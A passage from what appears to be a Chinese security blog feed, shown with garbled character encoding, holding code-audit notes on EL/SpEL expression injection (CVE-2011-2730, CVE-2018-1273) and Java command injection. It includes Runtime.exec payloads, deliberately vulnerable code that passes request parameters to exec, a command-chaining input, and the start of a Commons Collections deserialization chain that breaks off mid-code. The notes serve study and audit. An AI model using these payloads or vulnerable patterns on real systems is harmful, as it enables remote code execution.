    <content type="html"><![CDATA[<h2 id="1ã€ä»‹ç»"><a href="#1ã€ä»‹ç»" class="headerlink" title="1ã€ä»‹ç»"></a>1ã€ä»‹ç»</h2><p>è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼‰ç®€ç§° EL è¡¨è¾¾å¼ï¼Œæ˜¯ä¸€ç§ JSP å†…ç½®çš„è¯­è¨€ã€‚</p><p>åœ¨ JSP ä¸­ï¼Œä½¿ç”¨ ${} æ¥è¡¨ç¤º EL è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ ${name} è¡¨ç¤ºè·å– name å˜é‡ã€‚</p><p>åœ¨ EL è¡¨è¾¾å¼ä¸­æœ‰ä¸¤ç§è·å–å¯¹è±¡å±æ€§çš„æ–¹æ³•ï¼Œç¬¬ä¸€ç§ä¸º ${param.name}ï¼Œç¬¬äºŒç§ä¸º ${param[name]}</p><h2 id="2ã€å®ä¾‹"><a href="#2ã€å®ä¾‹" class="headerlink" title="2ã€å®ä¾‹"></a>2ã€å®ä¾‹</h2><h3 id="ä½¿ç”¨å®ä¾‹"><a href="#ä½¿ç”¨å®ä¾‹" class="headerlink" title="ä½¿ç”¨å®ä¾‹"></a>ä½¿ç”¨å®ä¾‹</h3><p>ä½¿ç”¨ param å¯¹è±¡è·å–ç”¨æˆ·ä¼ å…¥çš„å‚æ•°å€¼ï¼Œè¿™é‡Œçš„ ${param.name} ç›¸å½“äº request.getParameter(â€œnameâ€)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL è¡¨è¾¾å¼å®ä¾‹é¡µé¢<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>h3<span class="token punctuation">></span></span>è¾“å…¥çš„ name å€¼ä¸ºï¼š$<span class="token punctuation">&#123;</span>param<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å½“æˆ‘ä»¬è®¿é—® <a href="http://xxx:8080/xxx/?name=teamssix">http://xxx:8080/xxx/?name=teamssix</a> çš„æ—¶å€™ï¼Œé¡µé¢å°±ä¼šè¿”å›ã€Œè¾“å…¥çš„ name å€¼ä¸ºï¼šteamssixã€</p><p>EL è¡¨è¾¾å¼ä¹Ÿå¯ä»¥å®ä¾‹åŒ– Java çš„å†…ç½®ç±»ï¼Œæ¯”å¦‚ Runtime.class ä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL è¡¨è¾¾å¼å®ä¾‹é¡µé¢<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>$<span class="token punctuation">&#123;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æ‰§è¡Œè¯¥é¡µé¢ä»£ç æ—¶ï¼Œå°±å¯ä»¥çœ‹åˆ°è®¡ç®—å™¨è¢«å¼¹å‡ºæ¥äº†ï¼Œä¸è¿‡å‰ææ˜¯ Tomcat è¢«éƒ¨ç½²åœ¨ Windows ä¸‹ï¼Œå¦‚æœåœ¨ Linux ä¸‹åˆ™éœ€è¦å°† calc æ¢æˆå…¶ä»–å‘½ä»¤ï¼Œä¸ç„¶ä¼šæŠ¥é”™ 500</p><h3 id="Spring-æ ‡ç­¾-EL-è¡¨è¾¾å¼æ¼æ´ï¼ˆCVE-2011-2730ï¼‰"><a href="#Spring-æ ‡ç­¾-EL-è¡¨è¾¾å¼æ¼æ´ï¼ˆCVE-2011-2730ï¼‰" class="headerlink" title="Spring æ ‡ç­¾ EL è¡¨è¾¾å¼æ¼æ´ï¼ˆCVE-2011-2730ï¼‰"></a>Spring æ ‡ç­¾ EL è¡¨è¾¾å¼æ¼æ´ï¼ˆCVE-2011-2730ï¼‰</h3><p>åœ¨å†å²ä¸Šå‡ºç°è¿‡ä¸€ä¸ª Spring æ ‡ç­¾ EL è¡¨è¾¾å¼æ¼æ´ï¼ˆCVE-2011-2730ï¼‰ï¼ŒSpring è¡¨è¾¾å¼è¯­è¨€ï¼ˆSpELï¼‰æ˜¯ä¸€ç§ä¸ EL åŠŸèƒ½ç±»ä¼¼çš„è¡¨è¾¾å¼è¯­è¨€ã€‚</p><p>åœ¨æœªå¯¹ç”¨æˆ·çš„è¾“å…¥åšä¸¥æ ¼æ£€æŸ¥å¹¶ä¸”é”™è¯¯çš„ä½¿ç”¨ Spring è¡¨è¾¾å¼è¯­è¨€æ—¶å°±å¯èƒ½äº§ç”Ÿè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚</p><p>åœ¨ SpEL çš„ Evaluation æ¥å£ä¸­ï¼Œæœ‰ä¸¤ä¸ªå®ç°æ–¹æ³•ï¼Œåˆ†åˆ«ä¸º SimpleEvaluationContext å’Œ StandardEvaluationContext æ–¹æ³•ï¼Œå…¶ä¸­å‰è€…æƒé™æ¯”è¾ƒå°ï¼Œåè€…æƒé™æ¯”è¾ƒå¤§ï¼Œå› æ­¤å½“ä½¿ç”¨ StandardEvaluation æ–¹æ³•æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨ Runtime.class æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">EvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpEL</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">mian</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> expressionstr <span class="token operator">=</span> <span class="token string">"T(Runtime).getRuntime().exec(\"open -a Calculator\")"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EvaluationContext</span> evaluationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>expressionstr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>evaluationContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Spring-Data-Commons-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰"><a href="#Spring-Data-Commons-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰" class="headerlink" title="Spring Data Commons è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰"></a>Spring Data Commons è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰</h3><p>å¯¹äº 2018 å¹´å‡ºçš„ Spring Data Commons RCE æ¼æ´ï¼ŒRT å¯ä»¥é€šè¿‡æ„é€  SpEL è¡¨è¾¾å¼å®ç° RCE</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111291811883.png"></p><p>é€šè¿‡è§‚å¯Ÿå®˜æ–¹è¡¥ä¸ï¼Œå¯ä»¥å‘ç°æ­£æ˜¯å°†åŸæ¥çš„ StandardEvaluationContext æ–¹æ³•æ¢æˆäº† SimpleEvaluationContext æ–¹æ³•ã€‚</p><p>è¡¥ä¸åœ°å€ï¼š<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a?diff=unified#">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">175</span> <span class="token operator">-</span> <span class="token class-name">StandardEvaluationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">180 + EvaluationContext context &#x3D; SimpleEvaluationContext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/lup7in/article/details/8659408">https://blog.csdn.net/lup7in/article/details/8659408</a></p><p><a href="https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1ã€ä»‹ç»&quot;&gt;&lt;a href=&quot;#1ã€ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;1ã€ä»‹ç»&quot;&gt;&lt;/a&gt;1ã€ä»‹ç»&lt;/h2&gt;&lt;p&gt;è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼‰ç®€ç§° EL è¡¨è¾¾å¼ï¼Œæ˜¯ä¸€ç§ JSP å†…ç½®çš„è¯­è¨€ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ JS</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘å‘½ä»¤æ³¨å…¥å’Œä»£ç æ³¨å…¥</title>
    <link href="https://www.teamssix.com/211121-153433.html"/>
    <id>https://www.teamssix.com/211121-153433.html</id>
    <published>2021-11-21T07:34:33.000Z</published>
    <updated>2021-11-22T08:59:50.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-å‘½ä»¤æ³¨å…¥"><a href="#0x01-å‘½ä»¤æ³¨å…¥" class="headerlink" title="0x01 å‘½ä»¤æ³¨å…¥"></a>0x01 å‘½ä»¤æ³¨å…¥</h1><p>åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¼€å‘äººå‘˜å¯èƒ½éœ€è¦å¯¹ç³»ç»Ÿæ–‡ä»¶è¿›è¡Œç§»åŠ¨ã€åˆ é™¤æˆ–è€…æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ—¶å¦‚æœæ‰§è¡Œçš„å‘½ä»¤ç”¨æˆ·å¯æ§ï¼Œå°±ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h2 id="1ã€ç¤ºä¾‹"><a href="#1ã€ç¤ºä¾‹" class="headerlink" title="1ã€ç¤ºä¾‹"></a>1ã€ç¤ºä¾‹</h2><p>å½“å‘½ä»¤å¯æ§æ—¶ï¼Œå°±å¯èƒ½ä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ç§æ¼æ´åŸç†å¾ˆç®€å•ï¼Œä¸»è¦å°±æ˜¯æ‰¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œçœ‹å‘½ä»¤æ˜¯å¦å¯æ§ã€‚</p><p>java ç¨‹åºä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span>exec<span class="token class-name">Process</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">.</span>start<span class="token class-name">GroovyShell</span><span class="token punctuation">.</span>evaluate<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2ã€å‘½ä»¤æ³¨å…¥çš„é™åˆ¶"><a href="#2ã€å‘½ä»¤æ³¨å…¥çš„é™åˆ¶" class="headerlink" title="2ã€å‘½ä»¤æ³¨å…¥çš„é™åˆ¶"></a>2ã€å‘½ä»¤æ³¨å…¥çš„é™åˆ¶</h2><p>å¯¹äºç³»ç»Ÿå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨è¿æ¥ç¬¦æ¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œå¸¸è§è¿æ¥ç¬¦åŠå«ä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>    å¤šä¸ªå‘½ä»¤é¡ºåºæ‰§è¡Œï¼Œå‘½ä»¤ä¹‹é—´æ— ä»»ä½•é€»è¾‘å…³ç³»<span class="token operator">|</span>    å‰é¢å‘½ä»¤è¾“å‡ºç»“æœä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥å†…å®¹<span class="token operator">||</span>   é€»è¾‘æˆ–ï¼Œå½“å‰é¢å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œåé¢å‘½ä»¤æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™åé¢å‘½ä»¤ä¸æ‰§è¡Œ<span class="token operator">&amp;</span>    å‰é¢å‘½ä»¤æ‰§è¡Œåç»§ç»­æ‰§è¡Œåé¢å‘½ä»¤<span class="token operator">&amp;&amp;</span>   é€»è¾‘ä¸ï¼Œå½“å‰é¢å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œåé¢å‘½ä»¤æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™åé¢å‘½ä»¤ä¸æ‰§è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹äº Java ç¯å¢ƒä¸­çš„å‘½ä»¤æ³¨å…¥ï¼Œè¿æ¥ç¬¦çš„ä½¿ç”¨å­˜åœ¨ä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"ping "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå› ä¸º URL å¯æ§ï¼Œå› æ­¤å½“æˆ‘ä»¬è¾“å…¥ 127.0.0.1&amp;ipconfig æ—¶ï¼Œæ‹¼æ¥å‡ºæ¥çš„ç³»ç»Ÿå‘½ä»¤å°±æ˜¯ ping 127.0.0.1&amp;ipconfigï¼Œè¯¥å‘½ä»¤åœ¨ç³»ç»Ÿç»ˆç«¯ä¸‹æ˜¯èƒ½æ­£å¸¸è¿è¡Œçš„ï¼Œä½†æ˜¯åœ¨ Java ç¯å¢ƒä¸‹å°±ä¼šè¿è¡Œå¤±è´¥ï¼Œè¿™é‡Œå› ä¸º Java åœ¨ç¨‹åºå¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå°† 127.0.0.1&amp;ipconfig å½“åšä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²è€Œéä¸¤æ¡å‘½ä»¤ï¼Œå› æ­¤ä¸Šé¢çš„ä»£ç ä¸å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h1 id="0x02-ä»£ç æ³¨å…¥"><a href="#0x02-ä»£ç æ³¨å…¥" class="headerlink" title="0x02 ä»£ç æ³¨å…¥"></a>0x02 ä»£ç æ³¨å…¥</h1><h2 id="1ã€ä»‹ç»"><a href="#1ã€ä»‹ç»" class="headerlink" title="1ã€ä»‹ç»"></a>1ã€ä»‹ç»</h2><p>ä»£ç æ³¨å…¥å› ä¸ºæ˜¯ç›´æ¥æ³¨å…¥ä¸€æ®µä»£ç ï¼Œå› æ­¤è¦æ¯”å‘½ä»¤æ³¨å…¥æ›´åŠ çµæ´»ï¼Œå±å®³æ€§ä¹Ÿæ›´å¤§ã€‚</p><p>è¿™é‡Œä»¥ Apache Commons collections ç»„ä»¶ä¸ºä¾‹ã€‚</p><p>Apache Commons collections ç»„ä»¶ 3.1 ç‰ˆæœ¬æœ‰ä¸€æ®µåˆ©ç”¨åå°„æ¥å®Œæˆç‰¹å®šåŠŸèƒ½çš„ä»£ç ï¼Œæ§åˆ¶ç›¸å…³å‚æ•°åï¼Œå°±å¯ä»¥è¿›è¡Œä»£ç æ³¨å…¥ã€‚</p><p>è¿™é‡Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–çš„æ–¹å¼æ§åˆ¶ç›¸å…³å‚æ•°ï¼Œå®Œæˆæ³¨å…¥ä»£ç ï¼Œè¾¾åˆ°æ‰§è¡Œä»»æ„ä»£ç çš„æ•ˆæœã€‚</p><p>ä¸å‘½ä»¤æ³¨å…¥ç›¸æ¯”ï¼Œä»£ç æ³¨å…¥æ›´å…·æœ‰çµæ´»æ€§ï¼Œä¾‹å¦‚åœ¨ Apache Commons collections ååºåˆ—åŒ–æ¼æ´ä¸­ç›´æ¥ä½¿ç”¨ Runtime.getRuntime().exec() æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ˜¯æ— å›æ˜¾çš„ï¼Œä½†å¦‚æœé€šè¿‡ URLLoader è¿œç¨‹åŠ è½½ç±»æ–‡ä»¶ä»¥åŠå¼‚å¸¸å¤„ç†æœºåˆ¶å°±å¯ä»¥æ„é€ å‡ºå›æ˜¾çš„åˆ©ç”¨æ–¹å¼ã€‚</p><p>è¿™é‡Œå°±ä»¥ Apache Commons collections ååºåˆ—åŒ–æ¼æ´ä¸ºä¾‹ï¼Œä½“éªŒä¸€ä¸‹ä»£ç æ³¨å…¥ï¼Œå› ä¸ºç°é˜¶æ®µä¸ªäººæ°´å¹³æœ‰é™ï¼Œè¿™é‡Œè¿˜ä¸èƒ½å¯¹ Apache Commons collections ååºåˆ—åŒ–æ¼æ´çš„åŸç†è¿›è¡Œæ·±å…¥åˆ†æï¼Œç­‰åé¢å­¦ä¹ åˆ°ç›¸å…³å†…å®¹çš„æ—¶å€™ä¸å‡ºæ„å¤–åº”è¯¥è¿˜ä¼šç¢°åˆ°è¿™ä¸ªæ¼æ´ï¼Œé‚£ä¸ªæ—¶å€™å†å¥½å¥½åˆ†æåˆ†æè¿™ä¸ªæ¼æ´ã€‚</p><h2 id="2ã€Apache-Commons-collections-ååºåˆ—åŒ–æ¼æ´å¤ç°"><a href="#2ã€Apache-Commons-collections-ååºåˆ—åŒ–æ¼æ´å¤ç°" class="headerlink" title="2ã€Apache Commons collections ååºåˆ—åŒ–æ¼æ´å¤ç°"></a>2ã€Apache Commons collections ååºåˆ—åŒ–æ¼æ´å¤ç°</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¯¥æ¼æ´å½±å“äº† 3.1 åŠä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œä»¥ 3.1 ç‰ˆæœ¬ä¸ºä¾‹ï¼Œé¦–å…ˆä¸‹è½½ commons-collections-3.1.zip æ–‡ä»¶ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip">https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip</a></p><p>è§£å‹ commons-collections-3.1.zip å¯ä»¥å¾—åˆ° commons-collections-3.1.jar æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æ‰“å¼€ intelliJ IDEAï¼Œåˆ›å»ºä¸€ä¸ªæ™®é€šçš„ Java é¡¹ç›®ï¼Œç„¶åé€‰æ‹©ã€Œæ–‡ä»¶ â€“&gt; é¡¹ç›®ç»“æ„ â€“&gt; åº“ â€“&gt; + â€“&gt; Javaã€ï¼Œæ·»åŠ  commons-collections-3.1.jar åŒ…ï¼Œæˆ‘ä½¿ç”¨çš„ jdk ç‰ˆæœ¬ä¸º 1.8.0_191</p><p>æ¥ä¸‹æ¥åœ¨ã€Œsrc â€“&gt; com â€“&gt; commonsã€ç›®å½•ä¸‹åˆ›å»º ApacheCommonsCollectionsDemo.java æ–‡ä»¶ï¼ˆå³å‡» com.commons è½¯ä»¶åŒ…é€‰æ‹©ï¼šæ–°å»º â€“&gt; Java ç±»æ–‡ä»¶ï¼‰</p><h3 id="æ— å›æ˜¾åˆ©ç”¨"><a href="#æ— å›æ˜¾åˆ©ç”¨" class="headerlink" title="æ— å›æ˜¾åˆ©ç”¨"></a>æ— å›æ˜¾åˆ©ç”¨</h3><p>åœ¨ ApacheCommonsCollectionsDemo.java æ–‡ä»¶ä¸‹å†™å…¥ä»¥ä¸‹ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("calc")</span>        <span class="token comment">//æ„é€ æ¶æ„çš„chain</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token 